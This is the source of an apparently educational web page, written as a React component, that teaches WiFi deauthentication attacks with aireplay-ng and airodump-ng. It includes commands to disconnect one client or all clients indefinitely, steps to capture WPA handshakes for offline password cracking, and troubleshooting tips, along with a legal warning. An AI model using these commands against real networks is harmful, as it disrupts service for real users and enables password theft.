import Terminal from '../../components/Terminal';
import InfoBox from '../../components/InfoBox';
import Diagram from '../../components/Diagram';
import { Troubleshooting, TroubleItem } from '../../components/Troubleshooting';

export default function DeauthAttack() {
  return (
    <div className="content-area">
      <div className="topic-header">
        <div className="topic-breadcrumb">Pre Connection Attacks <span>/</span> Deauthentication Attack</div>
        <h1>Deauthentication Attack (Disconnecting Devices)</h1>
        <p className="topic-desc">A deauth attack sends forged deauthentication frames to disconnect clients from a network. This is done without being connected to the target network.</p>
      </div>

      <div className="topic-section">
        <h2>How Deauthentication Works</h2>
        <p>WiFi uses management frames for connecting/disconnecting. These frames are <strong>unencrypted</strong> and <strong>unauthenticated</strong> in WPA2 — meaning anyone can forge them.</p>

        <Diagram title="Deauthentication Attack Flow">
{`   Normal Connection:
   ┌────────┐                    ┌────────┐
   │ Client │◄──── WiFi Data ───▶│ Router │
   └────────┘                    └────────┘


   Deauth Attack:
   ┌────────┐                    ┌────────┐
   │ Client │◄──── WiFi Data ───▶│ Router │
   └────┬───┘                    └───┬────┘
        │                            │
        │   ┌──────────────┐         │
        │   │  ATTACKER    │         │
        │   │  (wlan0mon)  │         │
        │   └──────┬───────┘         │
        │          │                 │
        │◀─── Fake Deauth ──────────│   Forged: "Router says disconnect!"
        │          │                 │
        │          │────────────────▶│   Forged: "Client says disconnect!"
        │                            │
   DISCONNECTED!                     │
   (Must reconnect)                  │`}
        </Diagram>
      </div>

      <div className="topic-section">
        <h2>Why Use Deauth Attacks?</h2>
        <ul>
          <li><strong>Capture WPA handshake</strong> — Force client to reconnect, capturing the 4-way handshake</li>
          <li><strong>Denial of Service</strong> — Keep clients disconnected from a network</li>
          <li><strong>Force client to connect to evil twin</strong> — Redirect to your fake AP</li>
          <li><strong>Test network resilience</strong> — See how the network handles deauth floods</li>
        </ul>
      </div>

      <div className="topic-section">
        <h2>Performing a Deauth Attack</h2>

        <h3>Prerequisites</h3>
        <ol className="step-list">
          <li>Monitor mode enabled on your adapter</li>
          <li>Target network BSSID (from airodump-ng)</li>
          <li>Target client MAC address (optional — deauth all or specific client)</li>
        </ol>

        <h3>Step 1: Start Targeted Sniffing (in Terminal 1)</h3>
        <Terminal title="Terminal 1 — Capture" lines={[
          [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo airodump-ng ' }, { type: 'flag', text: '--bssid ' }, { type: 'highlight', text: 'AA:BB:CC:DD:EE:FF ' }, { type: 'flag', text: '--channel ' }, { type: 'number', text: '6 ' }, { type: 'flag', text: '--write ' }, { type: 'string', text: 'capture ' }, { type: 'string', text: 'wlan0mon' }],
        ]} />

        <h3>Step 2: Send Deauth Packets (in Terminal 2)</h3>

        <Terminal title="Deauth Specific Client" lines={[
          [{ type: 'comment', text: '# Deauth a specific client (send 10 deauth packets)' }],
          [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo aireplay-ng ' }, { type: 'flag', text: '--deauth ' }, { type: 'number', text: '10 ' }, { type: 'flag', text: '-a ' }, { type: 'highlight', text: 'AA:BB:CC:DD:EE:FF ' }, { type: 'flag', text: '-c ' }, { type: 'highlight', text: '11:22:33:44:55:66 ' }, { type: 'string', text: 'wlan0mon' }],
          [{ type: 'output', text: '12:34:56  Waiting for beacon frame (BSSID: AA:BB:CC:DD:EE:FF) on channel 6' }],
          [{ type: 'output', text: '12:34:56  Sending 64 directed DeAuth (code 7). STMAC: [11:22:33:44:55:66]' }],
          [{ type: 'output', text: '12:34:57  Sending 64 directed DeAuth (code 7). STMAC: [11:22:33:44:55:66]' }],
        ]} />

        <Terminal title="Deauth ALL Clients" lines={[
          [{ type: 'comment', text: '# Deauth everyone on the network (no -c flag)' }],
          [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo aireplay-ng ' }, { type: 'flag', text: '--deauth ' }, { type: 'number', text: '0 ' }, { type: 'flag', text: '-a ' }, { type: 'highlight', text: 'AA:BB:CC:DD:EE:FF ' }, { type: 'string', text: 'wlan0mon' }],
          [{ type: 'output', text: '' }],
          [{ type: 'comment', text: '# 0 = unlimited deauths (Ctrl+C to stop)' }],
        ]} />
      </div>

      <div className="topic-section">
        <h2>Command Breakdown</h2>
        <table className="info-table">
          <thead>
            <tr><th>Flag</th><th>Purpose</th></tr>
          </thead>
          <tbody>
            <tr><td><code>--deauth 10</code></td><td>Number of deauth packets to send (0 = infinite)</td></tr>
            <tr><td><code>-a AA:BB:CC:DD:EE:FF</code></td><td>BSSID of the target access point</td></tr>
            <tr><td><code>-c 11:22:33:44:55:66</code></td><td>MAC of specific client (omit to deauth all)</td></tr>
            <tr><td><code>wlan0mon</code></td><td>Your monitor mode interface</td></tr>
          </tbody>
        </table>

        <InfoBox type="danger" title="Legal Warning">
          <p>Deauth attacks are <strong>illegal</strong> on networks you don't own. This disrupts network service for real users. Only perform this on your own test network in your lab.</p>
        </InfoBox>
      </div>

      <div className="topic-section">
        <h2>Capturing the WPA Handshake</h2>
        <p>When a deauth'd client reconnects, the 4-way handshake is captured by airodump-ng. You'll see this in the top-right corner:</p>

        <Terminal title="Handshake Captured!" lines={[
          [{ type: 'output', text: ' CH  6 ][ Elapsed: 5 min ][ ' }, { type: 'highlight', text: 'WPA handshake: AA:BB:CC:DD:EE:FF' }, { type: 'output', text: ' ]' }],
          [{ type: 'output', text: '' }],
          [{ type: 'output', text: ' BSSID              PWR  Beacons  #Data  CH  ENC   ESSID' }],
          [{ type: 'output', text: ' AA:BB:CC:DD:EE:FF  -45    520     285    6  WPA2  TargetNetwork' }],
        ]} />

        <InfoBox type="tip" title="Key Point">
          <p>The text <code className="inline-code">WPA handshake: AA:BB:CC:DD:EE:FF</code> in the top right means you successfully captured the handshake. This capture file can now be used to crack the WiFi password offline.</p>
        </InfoBox>
      </div>

      <Troubleshooting>
        <TroubleItem issue="Deauth packets sent but client doesn't disconnect">
          <div className="solution">Solution:</div>
          <p>Multiple reasons:</p>
          <ul style={{ paddingLeft: 20, marginTop: 8 }}>
            <li>Your adapter doesn't support packet injection — test with <code className="inline-code">aireplay-ng --test wlan0mon</code></li>
            <li>You're too far from the client or AP — get physically closer</li>
            <li>The AP uses <strong>802.11w (Protected Management Frames)</strong> — deauth won't work, WPA3 networks have this</li>
            <li>Wrong channel — make sure airodump-ng is on the same channel</li>
          </ul>
        </TroubleItem>
        <TroubleItem issue="'Waiting for beacon frame' message loops forever">
          <div className="solution">Solution:</div>
          <p>Your adapter is on the wrong channel. Make sure the adapter is on the same channel as the target:</p>
          <Terminal title="Fix Channel" lines={[
            [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo iwconfig wlan0mon channel ' }, { type: 'number', text: '6' }],
          ]} />
        </TroubleItem>
        <TroubleItem issue="Handshake not captured after deauth">
          <div className="solution">Solution:</div>
          <p>Make sure airodump-ng is running with <code className="inline-code">--write</code> in a separate terminal <strong>before</strong> sending deauth. Also the client must actually reconnect — try sending just 4-5 deauths, not infinite.</p>
        </TroubleItem>
        <TroubleItem issue="aireplay-ng: command not found">
          <div className="solution">Solution:</div>
          <Terminal title="Install aircrack-ng suite" lines={[
            [{ type: 'prompt', text: '$ ' }, { type: 'command', text: 'sudo apt install aircrack-ng' }],
          ]} />
        </TroubleItem>
      </Troubleshooting>
    </div>
  );
}
